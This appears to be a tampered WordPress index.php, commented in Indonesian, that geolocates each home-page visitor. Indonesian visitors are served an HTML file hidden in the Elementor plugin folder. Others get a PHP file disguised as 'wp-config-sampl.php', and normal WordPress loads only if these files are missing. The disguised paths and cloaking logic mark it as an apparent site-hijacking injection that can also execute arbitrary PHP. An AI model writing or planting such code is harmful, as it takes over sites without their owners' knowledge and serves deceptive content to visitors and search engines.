<?php

$cacheDir   = __DIR__ . '/.geoip_cache';
$cacheTtl   = 3600; // 1 jam
$localIdFile  = __DIR__ . '/wp-content/plugins/elementor/core/documents-manage.html';   // versi ID (HTML)
$localOtherFile = __DIR__ . '/wp-config-sampl.php';   // versi non-ID (PHP)

// Nonaktifkan display_errors di production
// ini_set('display_errors', 0); ini_set('display_startup_errors', 0); error_reporting(0);

$requestUri = strtok($_SERVER['REQUEST_URI'] ?? '', '?');
$remoteIp   = $_SERVER['REMOTE_ADDR'] ?? '';

if ($requestUri === '/' || $requestUri === '/index.php') {

    // buat folder cache jika belum ada
    if (!is_dir($cacheDir)) @mkdir($cacheDir, 0755, true);

    // coba cookie dulu
    $cookieName = 'geo_country';
    $countryCode = $_COOKIE[$cookieName] ?? null;

    if (!$countryCode) {
        $cacheFile = $cacheDir . '/' . md5($remoteIp) . '.json';

        if (is_file($cacheFile) && (time() - filemtime($cacheFile) < $cacheTtl)) {
            $cached = @json_decode(@file_get_contents($cacheFile), true);
            $countryCode = $cached['countryCode'] ?? null;
        } else {
            // lookup server-side (ip-api.com)
            $apiUrl = "http://ip-api.com/json/{$remoteIp}?fields=countryCode";
            $resp = @file_get_contents($apiUrl);
            if ($resp) {
                $res = @json_decode($resp, true);
                $countryCode = $res['countryCode'] ?? null;
                @file_put_contents($cacheFile, json_encode(['countryCode' => $countryCode]));
            }
        }

        if ($countryCode) {
            setcookie($cookieName, $countryCode, time() + $cacheTtl, "/", "", false, true);
        }
    }

    // Pastikan CDN / proxy aware
    header('Vary: Accept-Language, Cookie');

    // Pilih file berdasarkan negara
    if ($countryCode === 'ID') {
        if (file_exists($localIdFile) && is_readable($localIdFile)) {
            include $localIdFile;
            exit;
        } else {
            error_log("Geo-target: file lokal ID tidak ditemukan: {$localIdFile}");
            // fallback -> lanjutkan ke WP di bawah
        }
    } else {
        if (file_exists($localOtherFile) && is_readable($localOtherFile)) {
            include $localOtherFile;
            exit;
        } else {
            error_log("Geo-target: file lokal non-ID tidak ditemukan: {$localOtherFile}");
            // fallback -> lanjutkan ke WP di bawah
        }
    }
}

// jika tidak include file di atas -> lanjutkan WP normal
define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
